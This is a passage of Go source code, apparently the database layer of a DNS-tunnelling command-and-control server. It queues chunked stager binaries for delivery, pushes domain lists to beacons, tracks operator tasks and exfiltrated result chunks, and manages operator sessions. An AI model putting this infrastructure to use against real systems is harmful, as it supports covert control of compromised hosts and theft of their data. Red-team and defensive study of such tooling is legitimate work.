	if successCount == 0 && len(dnsServerIDs) > 0 {
		return fmt.Errorf("failed to queue cache for any DNS servers")
	}

	fmt.Printf("[DB] Successfully queued stager cache for %d/%d DNS servers\n", successCount, len(dnsServerIDs))
	return nil
}

// GetPendingStagerCaches retrieves all pending cache tasks for a DNS server
func (d *MasterDatabase) GetPendingStagerCaches(dnsServerID string) ([]PendingStagerCache, error) {

	rows, err := d.db.Query(`
		SELECT psc.id, psc.client_binary_id, cb.base64_data, cb.total_chunks
		FROM pending_stager_caches psc
		JOIN client_binaries cb ON psc.client_binary_id = cb.id
		WHERE psc.dns_server_id = ? AND psc.delivered = 0
		ORDER BY psc.created_at ASC
	`, dnsServerID)

	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var caches []PendingStagerCache
	for rows.Next() {
		var id int
		var clientBinaryID, base64Data string
		var totalChunks int

		if err := rows.Scan(&id, &clientBinaryID, &base64Data, &totalChunks); err != nil {
			return nil, err
		}

		const chunkSize = 370
		var chunks []string
		for i := 0; i < len(base64Data); i += chunkSize {
			end := i + chunkSize
			if end > len(base64Data) {
				end = len(base64Data)
			}
			chunks = append(chunks, base64Data[i:end])
		}

		caches = append(caches, PendingStagerCache{
			ID:             id,
			ClientBinaryID: clientBinaryID,
			TotalChunks:    totalChunks,
			Chunks:         chunks,
		})
	}

	return caches, rows.Err()
}

// MarkStagerCacheDelivered marks cache tasks as delivered
func (d *MasterDatabase) MarkStagerCacheDelivered(cacheIDs []int) error {

	if len(cacheIDs) == 0 {
		return nil
	}

	now := time.Now().Unix()

	// Build placeholders for IN clause
	placeholders := make([]string, len(cacheIDs))
	args := make([]interface{}, len(cacheIDs)+1)
	args[0] = now

	for i, id := range cacheIDs {
		placeholders[i] = "?"
		args[i+1] = id
	}

	query := fmt.Sprintf(`
		UPDATE pending_stager_caches
		SET delivered = 1, delivered_at = ?
		WHERE id IN (%s)
	`, strings.Join(placeholders, ","))

	_, err := d.db.Exec(query, args...)
	return err
}

// QueueDomainUpdate queues a domain list update for a DNS server to push to beacons
func (d *MasterDatabase) QueueDomainUpdate(dnsServerID string, domainList []string) error {

	// Convert domain list to JSON
	domainsJSON, err := json.Marshal(domainList)
	if err != nil {
		return fmt.Errorf("failed to marshal domain list: %w", err)
	}

	now := time.Now().Unix()
	_, err = d.db.Exec(`
INSERT INTO domain_updates (dns_server_id, domain_list, created_at, delivered)
VALUES (?, ?, ?, 0)
`, dnsServerID, string(domainsJSON), now)

	return err
}

// GetPendingDomainUpdates retrieves undelivered domain updates for a DNS server
func (d *MasterDatabase) GetPendingDomainUpdates(dnsServerID string) ([]string, error) {

	var domainListJSON string
	err := d.db.QueryRow(`
SELECT domain_list FROM domain_updates
WHERE dns_server_id = ? AND delivered = 0
ORDER BY id DESC
LIMIT 1
`, dnsServerID).Scan(&domainListJSON)

	if err == sql.ErrNoRows {
		return nil, nil // No updates pending
	}
	if err != nil {
		return nil, err
	}

	var domains []string
	if err := json.Unmarshal([]byte(domainListJSON), &domains); err != nil {
		return nil, fmt.Errorf("failed to unmarshal domain list: %w", err)
	}

	return domains, nil
}

// MarkDomainUpdateDelivered marks domain updates as delivered for a DNS server
func (d *MasterDatabase) MarkDomainUpdateDelivered(dnsServerID string) error {

	_, err := d.db.Exec(`
UPDATE domain_updates
SET delivered = 1
WHERE dns_server_id = ? AND delivered = 0
`, dnsServerID)

	return err
}

// GetAllActiveDomains returns all domains from active DNS servers
func (d *MasterDatabase) GetAllActiveDomains() ([]string, error) {

	rows, err := d.db.Query(`
SELECT domain FROM dns_servers
WHERE status = 'active'
ORDER BY domain
`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var domains []string
	for rows.Next() {
		var domain string
		if err := rows.Scan(&domain); err != nil {
			return nil, err
		}
		domains = append(domains, domain)
	}

	return domains, rows.Err()
}

// GetAllDNSServers returns all DNS servers (for domain broadcasting)
func (d *MasterDatabase) GetAllDNSServers() ([]DNSServer, error) {

	rows, err := d.db.Query(`
SELECT id, domain, COALESCE(address, '') AS address, status FROM dns_servers
WHERE status = 'active'
`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var servers []DNSServer
	for rows.Next() {
		var id, domain, address, status string
		if err := rows.Scan(&id, &domain, &address, &status); err != nil {
			return nil, err
		}
		servers = append(servers, DNSServer{
			ID:      id,
			Domain:  domain,
			Address: address,
			Status:  status,
		})
	}

	return servers, rows.Err()
}

// DeleteTask removes a task and its associated data (results, progress)
// This allows operators to cancel pending tasks or clean up completed/failed tasks
func (d *MasterDatabase) DeleteTask(taskID string) error {

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("failed to begin transaction: %w", err)
	}
	defer tx.Rollback()

	// Delete task results
	if _, err := tx.Exec("DELETE FROM task_results WHERE task_id = ?", taskID); err != nil {
		return fmt.Errorf("failed to delete task results: %w", err)
	}

	// Delete task progress
	if _, err := tx.Exec("DELETE FROM task_progress WHERE task_id = ?", taskID); err != nil {
		return fmt.Errorf("failed to delete task progress: %w", err)
	}

	// Delete the task itself
	result, err := tx.Exec("DELETE FROM tasks WHERE id = ?", taskID)
	if err != nil {
		return fmt.Errorf("failed to delete task: %w", err)
	}

	rows, err := result.RowsAffected()
	if err != nil {
		return fmt.Errorf("failed to get rows affected: %w", err)
	}

	if rows == 0 {
		return fmt.Errorf("task not found")
	}

	return tx.Commit()
}

// UpdateTaskStatus updates the status of a task (e.g., mark as failed)
func (d *MasterDatabase) UpdateTaskStatus(taskID, status string) error {

	now := time.Now().Unix()
	result, err := d.db.Exec(`
		UPDATE tasks 
		SET status = ?, updated_at = ?
		WHERE id = ?
	`, status, now, taskID)
	if err != nil {
		return err
	}

	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("task not found")
	}

	return nil
}

// DeleteBeacon removes a beacon and its associated tasks/results
// This allows operators to clean up inactive or compromised beacons
func (d *MasterDatabase) DeleteBeacon(beaconID string) error {

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("failed to begin transaction: %w", err)
	}
	defer tx.Rollback()

	// Get all task IDs for this beacon
	rows, err := tx.Query("SELECT id FROM tasks WHERE beacon_id = ?", beaconID)
	if err != nil {
		return fmt.Errorf("failed to query tasks: %w", err)
	}

	var taskIDs []string
	for rows.Next() {
		var taskID string
		if err := rows.Scan(&taskID); err != nil {
			rows.Close()
			return fmt.Errorf("failed to scan task ID: %w", err)
		}
		taskIDs = append(taskIDs, taskID)
	}
	rows.Close()

	// Delete task results and progress for each task
	for _, taskID := range taskIDs {
		if _, err := tx.Exec("DELETE FROM task_results WHERE task_id = ?", taskID); err != nil {
			return fmt.Errorf("failed to delete task results: %w", err)
		}
		if _, err := tx.Exec("DELETE FROM task_progress WHERE task_id = ?", taskID); err != nil {
			return fmt.Errorf("failed to delete task progress: %w", err)
		}
	}

	// Delete all tasks for this beacon
	if _, err := tx.Exec("DELETE FROM tasks WHERE beacon_id = ?", beaconID); err != nil {
		return fmt.Errorf("failed to delete tasks: %w", err)
	}

	// Delete the beacon itself
	result, err := tx.Exec("DELETE FROM beacons WHERE id = ?", beaconID)
	if err != nil {
		return fmt.Errorf("failed to delete beacon: %w", err)
	}

	rowsAffected, err := result.RowsAffected()
	if err != nil {
		return fmt.Errorf("failed to get rows affected: %w", err)
	}

	if rowsAffected == 0 {
		return fmt.Errorf("beacon not found")
	}

	return tx.Commit()
}

// DeleteDNSServer removes a DNS server from the mesh
func (d *MasterDatabase) DeleteDNSServer(serverID string) error {

	result, err := d.db.Exec("DELETE FROM dns_servers WHERE id = ?", serverID)
	if err != nil {
		return fmt.Errorf("failed to delete DNS server: %w", err)
	}

	rowsAffected, err := result.RowsAffected()
	if err != nil {
		return fmt.Errorf("failed to get rows affected: %w", err)
	}

	if rowsAffected == 0 {
		return fmt.Errorf("dns server not found")
	}

	return nil
}

// CleanupOldTasks is DEPRECATED - beacon task history should be preserved indefinitely.
// Task records are valuable for auditing, incident response, and historical reference.
// If disk space becomes a concern, consider archiving instead of deleting.
// func (d *MasterDatabase) CleanupOldTasks(olderThanDays int) (int, error) { ... }

// CleanupInactiveBeacons is DEPRECATED - beacon records should NEVER be deleted.
// Reasons to preserve beacon records:
// 1. Historical reference - when did beacon first appear, what host/user/OS
// 2. Task history - what commands were executed on that system
// 3. Potential reconnection - beacon may come back online after long dormancy
// 4. Forensic value - correlate with incident timeline
// func (d *MasterDatabase) CleanupInactiveBeacons(inactiveDays int) (int, error) { ... }

// CleanupCompletedStagerSessions removes completed stager sessions older than specified days
func (d *MasterDatabase) CleanupCompletedStagerSessions(olderThanDays int) (int, error) {

	cutoff := time.Now().AddDate(0, 0, -olderThanDays).Unix()

	// Delete completed stager sessions (cascades to chunk_assignments)
	result, err := d.db.Exec(`
		DELETE FROM stager_sessions
		WHERE completed = 1 AND completed_at < ?
	`, cutoff)
	if err != nil {
		return 0, fmt.Errorf("failed to delete stager sessions: %w", err)
	}

	rows, err := result.RowsAffected()
	return int(rows), err
}

// CleanupStalePendingTasks marks pending tasks as expired if they've been pending too long
// This handles cases where beacons are lost/killed before claiming a task
// For long-term engagements (30min+ callbacks), 48 hours is reasonable timeout
func (d *MasterDatabase) CleanupStalePendingTasks(pendingHours int) (int, error) {

	cutoff := time.Now().Add(-time.Duration(pendingHours) * time.Hour).Unix()

	// Mark stale pending tasks as expired
	result, err := d.db.Exec(`
		UPDATE tasks 
		SET status = 'expired',
		    completed_at = ?
		WHERE status = 'pending' 
		  AND created_at < ?
	`, time.Now().Unix(), cutoff)
	if err != nil {
		return 0, fmt.Errorf("failed to expire stale pending tasks: %w", err)
	}

	rows, err := result.RowsAffected()
	return int(rows), err
}

// RequeueSentTasks resets tasks stuck in 'sent' with no result chunks back to 'pending'.
// Targets beacons that received a TASK but died before sending any RESULT_META/DATA.
// Only requeues if task_results has no data chunks (chunk_index > 0) for the task,
// meaning the beacon never started exfiltrating — the task can safely be re-delivered.
func (d *MasterDatabase) RequeueSentTasks(sentMinutes int) (int, error) {

	cutoff := time.Now().Add(-time.Duration(sentMinutes) * time.Minute).Unix()

	result, err := d.db.Exec(`
		UPDATE tasks
		SET status                  = 'pending',
		    sent_at                 = NULL,
		    delivered_by_dns_server = NULL,
		    updated_at              = ?
		WHERE status  = 'sent'
		  AND sent_at < ?
		  AND NOT EXISTS (
		      SELECT 1 FROM task_results
		      WHERE task_results.task_id = tasks.id
		        AND task_results.chunk_index > 0
		  )
	`, time.Now().Unix(), cutoff)
	if err != nil {
		return 0, fmt.Errorf("failed to requeue sent tasks: %w", err)
	}

	rows, _ := result.RowsAffected()
	return int(rows), nil
}

// Session Management

// CreateSession stores a new JWT session in the database
func (d *MasterDatabase) CreateSession(sessionID, operatorID, jti, tokenHash, ipAddress, userAgent string, expiresAt int64) error {

	now := time.Now().Unix()

	_, err := d.db.Exec(`
		INSERT INTO sessions (id, operator_id, jti, token_hash, created_at, expires_at, last_activity, ip_address, user_agent, is_revoked)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 0)
	`, sessionID, operatorID, jti, tokenHash, now, expiresAt, now, ipAddress, userAgent)

	return err
}

// IsSessionRevoked checks if a session with the given JTI is revoked.
// Uses a 30-second TTL cache to avoid repeated DB lookups on every authenticated request.
func (d *MasterDatabase) IsSessionRevoked(jti string) (bool, error) {
	// Check cache first (no DB lock needed)
	d.revokeCacheMutex.RLock()
	if entry, ok := d.revokeCache[jti]; ok && time.Now().Before(entry.expiresAt) {
		d.revokeCacheMutex.RUnlock()
		return entry.isRevoked, nil
	}
	d.revokeCacheMutex.RUnlock()

	// Cache miss — query DB

	var isRevoked bool
	err := d.db.QueryRow(`
		SELECT is_revoked FROM sessions WHERE jti = ?
	`, jti).Scan(&isRevoked)

	if err == sql.ErrNoRows {
		isRevoked = false
		err = nil
	}
	if err != nil {
		return isRevoked, err
	}

	// Cache result for 30 seconds
	d.revokeCacheMutex.Lock()
	d.revokeCache[jti] = revokeCacheEntry{isRevoked: isRevoked, expiresAt: time.Now().Add(30 * time.Second)}
	// Evict expired entries if cache is large
	if len(d.revokeCache) > 1000 {
		now := time.Now()
		for k, v := range d.revokeCache {
			if now.After(v.expiresAt) {
				delete(d.revokeCache, k)
			}
		}
	}
	d.revokeCacheMutex.Unlock()

	return isRevoked, nil
}

// RevokeSessionByJTI marks a session as revoked by its JTI
func (d *MasterDatabase) RevokeSessionByJTI(jti string) error {

	_, err := d.db.Exec(`
		UPDATE sessions SET is_revoked = 1 WHERE jti = ?
	`, jti)

	if err == nil {
		// Invalidate cache so the revocation takes effect immediately
		d.revokeCacheMutex.Lock()
		delete(d.revokeCache, jti)
		d.revokeCacheMutex.Unlock()
	}

	return err
}

// CleanupExpiredSessions removes expired and revoked sessions from the database
// This prevents session table bloat and ensures proper authentication state
func (d *MasterDatabase) CleanupExpiredSessions() (int, error) {

	now := time.Now().Unix()

	// Delete sessions that have expired (revoked sessions must persist until expiry
	// so that IsSessionRevoked continues to return true for their JTI)
	result, err := d.db.Exec(`
		DELETE FROM sessions
		WHERE expires_at < ?
	`, now)
	if err != nil {
		return 0, fmt.Errorf("failed to delete expired sessions: %w", err)
	}

	rows, err := result.RowsAffected()
	return int(rows), err
}

// DetectPartialResults marks tasks as 'partial' if chunks are incomplete after timeout
// This helps operators identify stuck exfiltrations from beacons that died mid-transfer
// Checks tasks in 'sent' status with incomplete chunked results
func (d *MasterDatabase) DetectPartialResults(sentHours int) (int, error) {

	cutoff := time.Now().Add(-time.Duration(sentHours) * time.Hour).Unix()

	// Find tasks that have been 'sent' for too long with incomplete chunks
	// A task is incomplete if: total_chunks > 0 AND received_chunks < total_chunks
	result, err := d.db.Exec(`
		UPDATE tasks 
		SET status = 'partial',
		    completed_at = ?
		WHERE status = 'sent'
		  AND sent_at < ?
		  AND EXISTS (
			  SELECT 1 FROM task_progress 
			  WHERE task_progress.task_id = tasks.id
				AND task_progress.total_chunks > 0
				AND task_progress.received_chunks < task_progress.total_chunks
		  )
	`, time.Now().Unix(), cutoff)
	if err != nil {
		return 0, fmt.Errorf("failed to detect partial results: %w", err)
	}

	rows, err := result.RowsAffected()
	return int(rows), err
}
